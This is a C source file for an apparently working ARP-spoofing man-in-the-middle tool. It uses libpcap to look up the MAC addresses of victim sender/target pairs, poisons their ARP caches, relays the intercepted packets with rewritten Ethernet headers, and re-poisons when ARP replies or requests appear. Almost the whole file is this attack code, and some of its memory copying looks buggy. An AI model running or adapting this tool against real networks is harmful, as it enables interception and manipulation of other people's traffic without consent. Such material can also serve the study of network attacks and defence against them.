#include "header.h"

static packet packet;
static repacket repacket;
void packet_relay(char*dev, u_char *my_mac, int argc, char **argv){
    int res;
    struct pcap_pkthdr *header;
    const u_char *packet_read;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    pcap_t* handle2 = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    uint32_t SenIP;
    uint32_t TarIP;
    u_char** sen_mac = (u_char**)malloc(sizeof(u_char*)*((argc-2)/2));
    u_char** tar_mac = (u_char**)malloc(sizeof(u_char*)*((argc-2)/2));
    for(int k=0; k<(argc-2)/2; k++)
    {
        sen_mac[k] = (u_char*)malloc(sizeof(u_char)*6);
        tar_mac[k] = (u_char*)malloc(sizeof(u_char)*6);
    }

    int l =0;
    int k=0;
    int w=0;
    int r=0;
        for(int i = 2; i < argc;i += 2){
            SenIP = inet_addr(argv[i]); //argv[2] = Sender IP
            TarIP = inet_addr(argv[i+1]); //argv[3] = Target IP
            my_mac = get_mymac(dev); //Get MyMac
            printf("k : %d \n",k);
            memcpy(sen_mac[k],get_senmac(dev, my_mac, SenIP),6); //Get SenMac
            memcpy(tar_mac[k],get_tarmac(dev, my_mac, TarIP),6); //Get TarMac
            k += 1;
        }
        l = 0;
        for(int i = 2; i < argc;i += 2){
            SenIP = inet_addr(argv[i]); //argv[2] = Sender IP
            TarIP = inet_addr(argv[i+1]); //argv[3] = Target IP
            my_mac = get_mymac(dev); //Get MyMac
            printf("l : %d \n",l);

            arp_spoof(dev, my_mac, sen_mac[l], SenIP, TarIP); //ARP Spoofs
            l += 1;
        }
        while(1){
            res=pcap_next_ex(handle, &header, &packet_read);
            printf("packetsize: %d \n", header->caplen);
            for(r=0;r < (argc-2)/2;r++){
            if(res==1 && packet_read[6]==sen_mac[r][0] && header->caplen<1400 && packet_read[13]!=0x06){
                printf("r = %d \n",r);
                my_mac = get_mymac(dev); //Get MyMac
                memcpy(&repacket, &packet_read, (header->caplen));
                memcpy(&repacket.eth.DMAC, &tar_mac[r][0],6);
                memcpy(&repacket.eth.SMAC, &my_mac[0],6);
                memcpy(&repacket.eth.Type, &packet_read[12],2);
                memcpy(&repacket.iph.verandh, &packet_read[14],1);
                memcpy(&repacket.iph.service, &packet_read[15],1);
                memcpy(&repacket.iph.totallength, &packet_read[16],2);
                memcpy(&repacket.iph.identi, &packet_read[18],2);
                memcpy(&repacket.iph.offset, &packet_read[20],2);
                memcpy(&repacket.iph.ttl, &packet_read[22],1);
                memcpy(&repacket.iph.pro, &packet_read[23],1);
                memcpy(&repacket.iph.checks, &packet_read[24],2);
                memcpy(&repacket.iph.SIP, &packet_read[26],4);
                memcpy(&repacket.iph.DIP, &packet_read[30],4);
                memcpy(&repacket.iph.DIP[4], &packet_read[34],(header->caplen)-sizeof(repacket));
                int res2 = pcap_sendpacket(handle2, (u_char*)&repacket, int(header->caplen));
                printf("RELAY PACKET SEND! \n");
                if(res2 == -1){printf("RELAY PACKET SEND Fail! \n");pcap_close(handle);pcap_close(handle2);return;}
            }else {
                printf("PACKET WAITING...\n");
            }}
            for(w=0;w < (argc-2)/2;w++){
            if(res==1 && ((packet_read[6]==sen_mac[w][0]&&packet_read[20] == 0x00 &&packet_read[21] == 0x02) || (packet_read[6]==sen_mac[w][0]&&packet_read[20] == 0x00 &&packet_read[21] == 0x01))){
                l = 0;
                for(int i = 2; i < argc;i += 2){
                    SenIP = inet_addr(argv[i]); //argv[2] = Sender IP
                    TarIP = inet_addr(argv[i+1]); //argv[3] = Target IP
                    my_mac = get_mymac(dev); //Get MyMac
                    printf("l : %d \n",l);

                    arp_spoof(dev, my_mac, sen_mac[l], SenIP, TarIP); //ARP Spoofs
                    l += 1;

                }
            }
            }
        }
    }

